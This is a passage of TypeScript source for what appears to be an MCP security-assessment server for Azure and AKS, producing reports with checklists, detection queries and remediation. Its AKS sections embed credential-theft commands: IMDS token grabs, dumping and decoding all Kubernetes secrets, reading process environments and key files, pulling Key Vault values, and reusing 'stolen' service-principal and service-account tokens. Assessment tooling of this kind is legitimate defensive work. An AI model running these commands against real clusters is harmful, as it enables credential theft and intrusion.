          report += `- [ ] IP Restrictions configured\n`;
          report += `- [ ] Access Restrictions with service tags\n\n`;
          
          report += `### Deployment Security\n`;
          report += `- [ ] SCM site (Kudu) secured\n`;
          report += `- [ ] FTP/FTPS disabled or secured\n`;
          report += `- [ ] Remote debugging disabled in production\n`;
          report += `- [ ] Deployment slots for safe releases\n\n`;
          
          report += `## Critical Findings to Check\n\n`;
          report += `| Finding | Severity | Impact |\n`;
          report += `|---------|----------|--------|\n`;
          report += `| HTTPS Only = false | HIGH | Data in transit exposed |\n`;
          report += `| TLS < 1.2 | HIGH | Vulnerable to protocol attacks |\n`;
          report += `| Remote Debugging = true | CRITICAL | Direct code execution |\n`;
          report += `| FTP Publishing enabled | MEDIUM | Credential theft risk |\n`;
          report += `| No IP Restrictions | MEDIUM | Open to all internet traffic |\n`;
          
          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing App Services: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "analyze_firewall_policies": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };
        
        try {
          const credential = new DefaultAzureCredential();
          const networkClient = new NetworkManagementClient(credential, subscriptionId);
          
          let report = `# Azure Firewall & NSG Policy Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          // Analyze NSGs
          report += `## Network Security Groups Analysis\n\n`;
          let criticalRules: string[] = [];
          let highRules: string[] = [];
          
          const nsgs = networkClient.networkSecurityGroups.listAll();
          for await (const nsg of nsgs) {
            if (resourceGroup && nsg.location !== resourceGroup) continue;
            
            for (const rule of nsg.securityRules || []) {
              // Check for overly permissive rules
              if (rule.access === 'Allow' && rule.direction === 'Inbound') {
                const isAnySource = rule.sourceAddressPrefix === '*' || 
                                    rule.sourceAddressPrefix === '0.0.0.0/0' ||
                                    rule.sourceAddressPrefix === 'Internet';
                const isAnyPort = rule.destinationPortRange === '*';
                
                if (isAnySource && isAnyPort) {
                  criticalRules.push(`**${nsg.name}/${rule.name}**: ANY source → ANY port (CRITICAL)`);
                } else if (isAnySource) {
                  // Check for sensitive ports
                  const port = rule.destinationPortRange || '';
                  const sensitivePort = ['22', '3389', '445', '1433', '3306', '5432'].includes(port);
                  if (sensitivePort) {
                    criticalRules.push(`**${nsg.name}/${rule.name}**: Internet → Port ${port}`);
                  } else {
                    highRules.push(`**${nsg.name}/${rule.name}**: Internet → Port ${port}`);
                  }
                }
              }
            }
          }
          
          if (criticalRules.length > 0) {
            report += `### [CRITICAL] CRITICAL Findings\n\n`;
            for (const rule of criticalRules) {
              report += `- ${rule}\n`;
            }
            report += `\n`;
          }
          
          if (highRules.length > 0) {
            report += `### [HIGH] HIGH Risk Rules\n\n`;
            for (const rule of highRules) {
              report += `- ${rule}\n`;
            }
            report += `\n`;
          }
          
          if (criticalRules.length === 0 && highRules.length === 0) {
            report += `[OK] No overly permissive NSG rules found\n\n`;
          }
          
          report += `## Firewall Best Practices\n\n`;
          report += `- Use Application Security Groups (ASGs) for workload segmentation\n`;
          report += `- Implement Azure Firewall Premium for threat intelligence\n`;
          report += `- Enable NSG Flow Logs for traffic analysis\n`;
          report += `- Use Azure DDoS Protection Standard for public endpoints\n`;
          
          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing firewall policies: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "analyze_logic_apps": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };
        
        try {
          let report = `# Logic Apps Security Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Logic App Security Checklist\n\n`;
          report += `### Access Control\n`;
          report += `- [ ] IP-based access restrictions configured\n`;
          report += `- [ ] SAS tokens for trigger authentication\n`;
          report += `- [ ] OAuth 2.0 for HTTP triggers\n`;
          report += `- [ ] Azure AD authentication for management\n\n`;
          
          report += `### Secrets Management\n`;
          report += `- [ ] Managed Identity for connector authentication\n`;
          report += `- [ ] Key Vault references for secrets\n`;
          report += `- [ ] No hardcoded credentials in workflow\n\n`;
          
          report += `### Monitoring\n`;
          report += `- [ ] Diagnostic settings enabled\n`;
          report += `- [ ] Run history retention configured\n`;
          report += `- [ ] Alerts on failures\n\n`;
          
          report += `## Attack Vectors\n\n`;
          report += `| Vector | Risk | Mitigation |\n`;
          report += `|--------|------|------------|\n`;
          report += `| Exposed HTTP trigger | HIGH | Use SAS or OAuth authentication |\n`;
          report += `| Credential in workflow | CRITICAL | Use Managed Identity + Key Vault |\n`;
          report += `| SSRF via connectors | MEDIUM | Restrict connector permissions |\n`;
          report += `| Run history exposure | MEDIUM | Configure retention and access |\n`;
          
          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing Logic Apps: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "analyze_rbac_privilege_escalation": {
        const { subscriptionId, targetPrincipal } = request.params.arguments as {
          subscriptionId: string;
          targetPrincipal?: string;
        };
        
        try {
          const credential = new DefaultAzureCredential();
          const authClient = new AuthorizationManagementClient(credential, subscriptionId);
          
          let report = `# RBAC Privilege Escalation Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          // Dangerous permissions
          const dangerousPermissions = [
            'Microsoft.Authorization/roleAssignments/write',
            'Microsoft.Authorization/roleDefinitions/write',
            '*/write',
            '*',
          ];
          
          report += `## Role Assignments with Dangerous Permissions\n\n`;
          
          let escalationPaths: string[] = [];
          const assignments = authClient.roleAssignments.listForSubscription();
          
          for await (const assignment of assignments) {
            // Check if this assignment grants dangerous permissions
            const roleId = assignment.roleDefinitionId?.split('/').pop();
            
            // Well-known dangerous roles
            const dangerousRoles = ['Owner', 'User Access Administrator', 'Contributor'];
            if (dangerousRoles.some(r => assignment.roleDefinitionId?.includes(r))) {
              escalationPaths.push(`**${assignment.principalId}** has ${assignment.roleDefinitionId?.split('/').pop()} at scope: ${assignment.scope}`);
            }
          }
          
          if (escalationPaths.length > 0) {
            report += `### [WARN] Potential Escalation Paths\n\n`;
            for (const path of escalationPaths.slice(0, 20)) {
              report += `- ${path}\n`;
            }
            if (escalationPaths.length > 20) {
              report += `\n...and ${escalationPaths.length - 20} more\n`;
            }
          } else {
            report += `[OK] No obvious escalation paths found\n`;
          }
          
          report += `\n## Common RBAC Privilege Escalation Techniques\n\n`;
          report += `| Technique | Required Permission | Impact |\n`;
          report += `|-----------|---------------------|--------|\n`;
          report += `| Role Assignment | roleAssignments/write | Grant self Owner |\n`;
          report += `| Custom Role | roleDefinitions/write | Create privileged role |\n`;
          report += `| VM Run Command | virtualMachines/runCommand | Execute as system |\n`;
          report += `| Managed Identity | userAssignedIdentities/* | Assume identity |\n`;
          report += `| Key Vault Access | keyVault/vaults/accessPolicies/write | Access secrets |\n`;
          
          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing RBAC: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "detect_persistence_mechanisms": {
        const { subscriptionId } = request.params.arguments as {
          subscriptionId: string;
        };
        
        try {
          let report = `# Azure Persistence Mechanism Detection\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Common Azure Persistence Techniques\n\n`;
          
          report += `### 1. Automation Accounts & Runbooks\n`;
          report += `- Check for suspicious runbooks with PowerShell scripts\n`;
          report += `- Look for RunAs accounts with high privileges\n`;
          report += `- Monitor for scheduled runbook executions\n\n`;
          
          report += `### 2. Logic Apps Triggers\n`;
          report += `- HTTP triggers accessible without authentication\n`;
          report += `- Recurrence triggers for periodic execution\n`;
          report += `- Service Bus / Event Grid triggers\n\n`;
          
          report += `### 3. Azure Functions\n`;
          report += `- Timer-triggered functions for scheduled tasks\n`;
          report += `- HTTP functions with weak authentication\n`;
          report += `- Event-driven functions (Storage, Service Bus)\n\n`;
          
          report += `### 4. VM Extensions\n`;
          report += `- Custom Script Extensions\n`;
          report += `- DSC Extensions for configuration\n`;
          report += `- Run Command execution history\n\n`;
          
          report += `### 5. Service Principals & Managed Identities\n`;
          report += `- Service principals with key credentials\n`;
          report += `- User-assigned managed identities\n`;
          report += `- Long-lived credentials without expiry\n\n`;
          
          report += `## Detection Queries (Azure Monitor / Sentinel)\n\n`;
          report += `\`\`\`kusto\n`;
          report += `// Detect new automation runbook creation\n`;
          report += `AzureActivity\n`;
          report += `| where OperationNameValue == "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/WRITE"\n`;
          report += `| project TimeGenerated, Caller, ResourceGroup, Resource\n`;
          report += `\`\`\`\n\n`;
          
          report += `\`\`\`kusto\n`;
          report += `// Detect new service principal creation\n`;
          report += `AuditLogs\n`;
          report += `| where OperationName == "Add service principal"\n`;
          report += `| project TimeGenerated, InitiatedBy, TargetResources\n`;
          report += `\`\`\`\n`;
          
          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error detecting persistence: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "scan_aks_service_accounts": {
        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
        };

        try {
          const containerClient = new ContainerServiceClient(credential, subscriptionId);
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          const findings: any[] = [];
          let riskScore = 0;

          // TC-AKSSA-001: Check if Workload Identity is enabled
          if (!cluster.securityProfile?.workloadIdentity?.enabled) {
            findings.push({
              id: 'TC-AKSSA-001',
              severity: 'HIGH',
              name: 'Azure Workload Identity Not Configured',
              description: 'Pods may be using IMDS to get managed identity tokens instead of Workload Identity',
              mitre: 'T1552.005 - Cloud Instance Metadata API',
              test: 'kubectl get sa -A -o json | jq -r \'.items[] | select(.metadata.annotations["azure.workload.identity/client-id"] == null) | "\\(.metadata.namespace)/\\(.metadata.name)"\'',
              remediation: 'Enable Workload Identity: az aks update -g <rg> -n <cluster> --enable-oidc-issuer --enable-workload-identity',
              payload: 'curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"',
            });
            riskScore += 35;
          }

          // TC-AKSSA-002: Check Azure AD integration
          if (!cluster.aadProfile?.managed) {
            findings.push({
              id: 'TC-AKSSA-002',
              severity: 'MEDIUM',
              name: 'Azure AD Integration Not Enabled',
              description: 'Cluster not using Azure AD for authentication, may rely on client certificates',
              mitre: 'T1078.004 - Valid Accounts: Cloud Accounts',
              test: 'az aks show -g <rg> -n <cluster> --query "aadProfile"',
              remediation: 'az aks update -g <rg> -n <cluster> --enable-aad --aad-admin-group-object-ids <group-id>',
              payload: null,
            });
            riskScore += 20;
          }

          // TC-AKSSA-003: Check OIDC issuer for federated identity
          if (!cluster.oidcIssuerProfile?.enabled) {
            findings.push({
              id: 'TC-AKSSA-003',
              severity: 'HIGH',
              name: 'OIDC Issuer Not Enabled',
              description: 'Cannot use federated identity credentials for service accounts',
              mitre: 'T1528 - Steal Application Access Token',
              test: 'az aks show -g <rg> -n <cluster> --query "oidcIssuerProfile"',
              remediation: 'az aks update -g <rg> -n <cluster> --enable-oidc-issuer',
              payload: null,
            });
            riskScore += 25;
          }

          // Generate kubectl commands for further SA analysis
          const saAnalysisCommands = `
## Service Account Security Analysis Commands

### 1. Find pods using default service account
\`\`\`bash
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) | "\\(.metadata.namespace)/\\(.metadata.name)"'
\`\`\`

### 2. Find ClusterRoleBindings for service accounts
\`\`\`bash
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | "\\(.metadata.name): \\(.subjects[].namespace)/\\(.subjects[].name) -> \\(.roleRef.name)"'
\`\`\`

### 3. Find SAs with cluster-admin role
\`\`\`bash
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | select(.subjects[]?.kind == "ServiceAccount") | .subjects[] | select(.kind == "ServiceAccount") | "\\(.namespace)/\\(.name)"'
\`\`\`

### 4. Check SA impersonation permissions
\`\`\`bash
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "impersonate") | .metadata.name'
\`\`\`

### 5. Find legacy SA token secrets
\`\`\`bash
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'
\`\`\`

### 6. Check automountServiceAccountToken on default SA
\`\`\`bash
kubectl get sa default -o yaml | grep -A5 automountServiceAccountToken
\`\`\`
`;

          const report = `# AKS Service Account Security Analysis

## Cluster: ${clusterName}
**Resource Group:** ${resourceGroup}
**Subscription:** ${subscriptionId}
**Kubernetes Version:** ${cluster.kubernetesVersion}
**Scan Time:** ${new Date().toISOString()}

## Risk Assessment
- **Risk Score:** ${riskScore}/100
- **Risk Level:** ${riskScore >= 50 ? 'CRITICAL' : riskScore >= 30 ? 'HIGH' : riskScore >= 15 ? 'MEDIUM' : 'LOW'}
- **Findings:** ${findings.length}

## Cluster Security Configuration
| Setting | Status |
|---------|--------|
| Workload Identity | ${cluster.securityProfile?.workloadIdentity?.enabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
| OIDC Issuer | ${cluster.oidcIssuerProfile?.enabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Azure AD Integration | ${cluster.aadProfile?.managed ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Pod Identity (Legacy) | ${cluster.podIdentityProfile?.enabled ? '[WARN] Legacy' : '[-] Not Used'} |
| Private Cluster | ${cluster.apiServerAccessProfile?.enablePrivateCluster ? '[OK] Yes' : '[FAIL] No'} |

## Findings

${findings.map(f => `### ${f.id}: ${f.name}
**Severity:** ${f.severity}
**MITRE ATT&CK:** ${f.mitre}

${f.description}

**Detection:**
\`\`\`bash
${f.test}
\`\`\`

**Remediation:**
\`\`\`bash
${f.remediation}
\`\`\`

${f.payload ? `**Exploitation:**
\`\`\`bash
${f.payload}
\`\`\`` : ''}
`).join('\n---\n\n')}

${saAnalysisCommands}`;

          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error scanning AKS service accounts: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "hunt_aks_secrets": {
        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
        };

        try {
          const containerClient = new ContainerServiceClient(credential, subscriptionId);
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          // Check for Key Vault CSI driver
          const kvCsiEnabled = cluster.addonProfiles?.azureKeyvaultSecretsProvider?.enabled || false;
          
          const report = `# AKS Secret Hunting Guide

## Cluster: ${clusterName}
**Resource Group:** ${resourceGroup}
**Subscription:** ${subscriptionId}
**Kubernetes Version:** ${cluster.kubernetesVersion}
**Scan Time:** ${new Date().toISOString()}

## Cluster Secret Configuration
| Feature | Status |
|---------|--------|
| Key Vault CSI Driver | ${kvCsiEnabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Azure AD Integration | ${cluster.aadProfile?.managed ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Workload Identity | ${cluster.securityProfile?.workloadIdentity?.enabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
| Disk Encryption | ${cluster.diskEncryptionSetID ? '[OK] Enabled' : '[FAIL] Default'} |

---

## Secret Hunting Commands

### 1. Enumerate All Kubernetes Secrets (TC-AKSSEC-001)
**Risk:** CRITICAL | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# List all secrets
kubectl get secrets -A

# Get secret type distribution
kubectl get secrets -A -o json | jq -r '.items[] | .type' | sort | uniq -c

# Find interesting secrets by name
kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.type)"' | grep -iE "password|token|key|cred|secret|api|db|azure|storage"

# Dump all secrets (DANGEROUS)
kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data | to_entries[] | "  \\(.key): \\(.value | @base64d)")"'
\`\`\`

---

### 2. Secrets in Environment Variables (TC-AKSSEC-002)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Find pods with secrets in env vars
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].env[]?.valueFrom.secretKeyRef != null) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Get details of secret references
kubectl get pods -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):" as \\$pod | .spec.containers[] | .env[]? | select(.valueFrom.secretKeyRef != null) | "\\(\\$pod) \\(.name)=\\(.valueFrom.secretKeyRef.name)/\\(.valueFrom.secretKeyRef.key)"'

# From compromised pod - read env vars
env | grep -iE "password|secret|token|key|azure|storage"
cat /proc/1/environ | tr '\\0' '\\n' | grep -iE "password|secret|token"
\`\`\`

---

### 3. Azure Key Vault Secrets (TC-AKSSEC-003)
**Risk:** HIGH | **MITRE:** T1552.005 - Cloud Instance Metadata API
**Key Vault CSI Status:** ${kvCsiEnabled ? '[OK] Enabled - Check SecretProviderClass' : '[FAIL] Disabled - May use IMDS'}

\`\`\`bash
# Find SecretProviderClass resources
kubectl get secretproviderclass -A -o yaml

# Extract vault names
kubectl get secretproviderclass -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.spec.parameters.keyvaultName)"'

# Get token via IMDS (if not using Workload Identity)
TOKEN=\\$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)

# List secrets in vault
VAULT="<vault-name>"
curl -s -H "Authorization: Bearer \\$TOKEN" "https://\\$VAULT.vault.azure.net/secrets?api-version=7.3"

# Get secret value
curl -s -H "Authorization: Bearer \\$TOKEN" "https://\\$VAULT.vault.azure.net/secrets/<secret-name>?api-version=7.3" | jq -r .value
\`\`\`

---

### 4. Azure Storage Account Credentials (TC-AKSSEC-004)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Find storage secrets in K8s
kubectl get secrets -A -o json | jq -r '.items[] | select(.data | keys[] | test("storage|connection|sas"; "i")) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Extract Azure Files secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.data.azurestorageaccountkey != null) | "\\(.metadata.namespace)/\\(.metadata.name): \\(.data.azurestorageaccountname | @base64d) / \\(.data.azurestorageaccountkey | @base64d)"'

# Find PVs using Azure storage
kubectl get pv -o json | jq -r '.items[] | select(.spec.azureFile != null or .spec.azureDisk != null) | "\\(.metadata.name): \\(.spec.azureFile.secretName // .spec.azureDisk)"'

# Use identity to get storage keys
az storage account keys list -n <storage> --query '[0].value' -o tsv
\`\`\`

---

### 5. Secrets in ConfigMaps (TC-AKSSEC-005)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Search ConfigMaps for sensitive keywords
kubectl get configmaps -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data // {} | to_entries[] | "  \\(.key)")"' | grep -iE "password|secret|token|key|credential|connection"

# Find Azure connection strings
kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[]? | .value' | grep -iE "AccountKey=|SharedAccessSignature=|Server=.*Password="
\`\`\`

---

### 6. Mounted Secret Files (TC-AKSSEC-006)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Find pods with secret volume mounts
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.secret != null) | "\\(.metadata.namespace)/\\(.metadata.name): \\([.spec.volumes[] | select(.secret != null) | .secret.secretName] | join(", "))"'

# From compromised pod - find secrets
find / -type f \\( -name "*.key" -o -name "*.pem" -o -name "*secret*" -o -name "*credential*" \\) 2>/dev/null | xargs cat

# Common paths
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /mnt/secrets-store/*
find / -name "azure.json" 2>/dev/null | xargs cat
\`\`\`

---

### 7. Service Principal Credentials (TC-AKSSEC-007)
**Risk:** CRITICAL | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Check azure.json on node (contains SP or managed identity info)
kubectl debug node/<node> -it --image=mcr.microsoft.com/azure-cli -- cat /etc/kubernetes/azure.json

# Find SP secrets in K8s
kubectl get secrets -A -o json | jq -r '.items[] | select(.data | keys[] | test("client|secret|sp|serviceprincipal"; "i")) | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Login with stolen SP
az login --service-principal -u <aadClientId> -p <aadClientSecret> --tenant <tenantId>
\`\`\`

---

### 8. Container Registry Credentials (TC-AKSSEC-009)
**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files

\`\`\`bash
# Find docker registry secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Extract registry creds
kubectl get secret <registry-secret> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq -r '.auths | to_entries[] | "\\(.key): \\(.value.auth | @base64d)"'

# Use credentials
docker login <registry> -u <user> -p <password>
\`\`\`

---

### 9. Service Account Tokens (TC-AKSSA-001)
**Risk:** CRITICAL | **MITRE:** T1528 - Steal Application Access Token

\`\`\`bash
# Find SA token secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'

# Steal token from compromised pod
TOKEN=\\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Check permissions
kubectl auth can-i --list --token=\\$TOKEN

# Use token
kubectl --token=\\$TOKEN get pods -A
\`\`\`

---

## Remediation Summary

1. **Enable Workload Identity** instead of pod managed identity
2. **Use Key Vault CSI driver** for secret injection
3. **Disable automountServiceAccountToken** on default SA
4. **Use short-lived projected tokens** instead of legacy secrets
5. **Apply RBAC restrictions** on secret access
6. **Enable audit logging** for secret access events
`;

          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error hunting AKS secrets: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "scan_aks_full": {
        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
        };

        try {
          const aksClient = new ContainerServiceClient(credential, subscriptionId);
          const computeClient = new ComputeManagementClient(credential, subscriptionId);
          
          let output = `# � COMPREHENSIVE AKS SECURITY ASSESSMENT\n\n`;
          output += `**Cluster:** ${clusterName}\n`;
          output += `**Resource Group:** ${resourceGroup}\n`;
          output += `**Subscription:** ${subscriptionId}\n`;
          output += `**Scan Time:** ${new Date().toISOString()}\n`;
          output += `**Scanner:** Stratos MCP v1.9.3\n\n`;
          output += `---\n\n`;

          // Get cluster details
          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
          
          let criticalCount = 0;
          let highCount = 0;
          let mediumCount = 0;
          let lowCount = 0;
          
          // Store all findings with CIS mapping
          const allFindings: Array<{severity: string; finding: string; cis?: string; remediation: string}> = [];

          // ========== 1. CLUSTER OVERVIEW ==========
          output += `## 📋 Cluster Overview\n\n`;
          output += `| Property | Value |\n|----------|-------|\n`;
          output += `| Kubernetes Version | ${cluster.kubernetesVersion} |\n`;
          output += `| SKU Tier | ${cluster.sku?.tier || 'Free'} |\n`;
          output += `| Location | ${cluster.location} |\n`;
          output += `| Provisioning State | ${cluster.provisioningState} |\n`;
          output += `| Power State | ${cluster.powerState?.code || 'Running'} |\n`;
          output += `| FQDN | ${cluster.fqdn || 'N/A'} |\n`;
          output += `| Private FQDN | ${cluster.privateFqdn || 'N/A'} |\n`;
          output += `| Node Resource Group | ${cluster.nodeResourceGroup} |\n`;
          output += `| DNS Prefix | ${cluster.dnsPrefix} |\n\n`;

          // Kubernetes Version EOL Check
          const k8sVersion = cluster.kubernetesVersion || '';
          const versionParts = k8sVersion.split('.');
          const minorVersion = parseInt(versionParts[1] || '0');
          
          // K8s versions older than 1.27 are EOL as of Jan 2026
          if (minorVersion < 28) {
            allFindings.push({
              severity: 'CRITICAL',
              finding: `Kubernetes version ${k8sVersion} is approaching or past End-of-Life`,
              cis: 'CIS 1.1.1',
              remediation: 'Upgrade to a supported Kubernetes version (1.28+)'
            });
            criticalCount++;
          } else if (minorVersion < 29) {
            allFindings.push({
              severity: 'MEDIUM',
              finding: `Kubernetes version ${k8sVersion} - consider upgrading to latest`,
              cis: 'CIS 1.1.1',
              remediation: 'Plan upgrade to latest Kubernetes version'
            });
            mediumCount++;
          }

          // SKU Tier Check
          if (cluster.sku?.tier === 'Free') {
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Using Free tier - no SLA, limited features',
              remediation: 'Consider Standard tier for production (99.9% SLA, uptime guarantees)'
            });
            mediumCount++;
          }

          // ========== 2. AUTHENTICATION & AUTHORIZATION ==========
          output += `## 🔑 Authentication & Authorization\n\n`;
          output += `| Security Control | Status | Risk |\n|------------------|--------|------|\n`;
          
          // RBAC
          if (!cluster.enableRbac) {
            output += `| RBAC | ❌ Disabled | CRITICAL |\n`;
            allFindings.push({
              severity: 'CRITICAL',
              finding: 'RBAC is DISABLED - all users have full cluster access',
              cis: 'CIS 5.1.1',
              remediation: 'Enable RBAC on cluster (requires cluster recreation)'
            });
            criticalCount++;
          } else {
            output += `| RBAC | ✅ Enabled | OK |\n`;
          }

          // Azure AD Integration
          if (!cluster.aadProfile) {
            output += `| Azure AD Integration | ❌ Not Configured | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'Azure AD integration not configured - using K8s-only auth',
              cis: 'CIS 3.1.1',
              remediation: 'Enable Azure AD integration for centralized identity management'
            });
            highCount++;
          } else {
            output += `| Azure AD Integration | ✅ Enabled | OK |\n`;
            
            // Check for managed AAD vs legacy
            if (cluster.aadProfile.managed) {
              output += `| Managed AAD | ✅ Yes | OK |\n`;
            } else {
              output += `| Managed AAD | ⚠️ Legacy | MEDIUM |\n`;
              allFindings.push({
                severity: 'MEDIUM',
                finding: 'Using legacy Azure AD integration (not managed)',
                remediation: 'Migrate to managed Azure AD integration'
              });
              mediumCount++;
            }

            // Check Azure RBAC for K8s
            if (cluster.aadProfile.enableAzureRbac) {
              output += `| Azure RBAC for K8s | ✅ Enabled | OK |\n`;
            } else {
              output += `| Azure RBAC for K8s | ⚠️ Disabled | MEDIUM |\n`;
              allFindings.push({
                severity: 'MEDIUM',
                finding: 'Azure RBAC for Kubernetes not enabled',
                remediation: 'Enable Azure RBAC for centralized access control via Azure IAM'
              });
              mediumCount++;
            }

            // Check admin group
            if (cluster.aadProfile.adminGroupObjectIDs && cluster.aadProfile.adminGroupObjectIDs.length > 0) {
              output += `| Admin Groups | ${cluster.aadProfile.adminGroupObjectIDs.length} configured | INFO |\n`;
            }
          }

          // Local Accounts
          if (!cluster.disableLocalAccounts) {
            output += `| Local Accounts | ⚠️ Enabled | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'Local accounts enabled - admin kubeconfig available via az aks get-credentials --admin',
              cis: 'CIS 3.1.2',
              remediation: 'Disable local accounts: az aks update --disable-local-accounts'
            });
            highCount++;
          } else {
            output += `| Local Accounts | ✅ Disabled | OK |\n`;
          }

          output += '\n';

          // ========== 3. NETWORK SECURITY ==========
          output += `## 🌐 Network Security\n\n`;
          output += `| Security Control | Status | Risk |\n|------------------|--------|------|\n`;
          
          // Private Cluster
          if (!cluster.apiServerAccessProfile?.enablePrivateCluster) {
            output += `| Private Cluster | ❌ No | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'API server is publicly accessible (not private cluster)',
              cis: 'CIS 4.1.1',
              remediation: 'Enable private cluster or configure authorized IP ranges'
            });
            highCount++;
          } else {
            output += `| Private Cluster | ✅ Yes | OK |\n`;
          }

          // Authorized IP Ranges
          const authIPs = cluster.apiServerAccessProfile?.authorizedIPRanges || [];
          if (authIPs.length === 0 && !cluster.apiServerAccessProfile?.enablePrivateCluster) {
            output += `| Authorized IP Ranges | ❌ Not Configured | HIGH |\n`;
            allFindings.push({
              severity: 'HIGH',
              finding: 'No authorized IP ranges - API server open to internet',
              cis: 'CIS 4.1.2',
              remediation: 'Configure authorized IP ranges: az aks update --api-server-authorized-ip-ranges <IPs>'
            });
            highCount++;
          } else if (authIPs.length > 0) {
            output += `| Authorized IP Ranges | ✅ ${authIPs.length} ranges | OK |\n`;
          }

          // Network Plugin
          const networkPlugin = cluster.networkProfile?.networkPlugin || 'kubenet';
          output += `| Network Plugin | ${networkPlugin} | INFO |\n`;
          
          if (networkPlugin === 'kubenet') {
            allFindings.push({
              severity: 'LOW',
              finding: 'Using kubenet (basic) networking',
              remediation: 'Consider Azure CNI for better network policy support and performance'
            });
            lowCount++;
          }

          // Network Policy
          const networkPolicy = cluster.networkProfile?.networkPolicy;
          if (!networkPolicy) {
            output += `| Network Policy | ❌ None | CRITICAL |\n`;
            allFindings.push({
              severity: 'CRITICAL',
              finding: 'Network policy NOT configured - pods can communicate freely',
              cis: 'CIS 5.3.2',
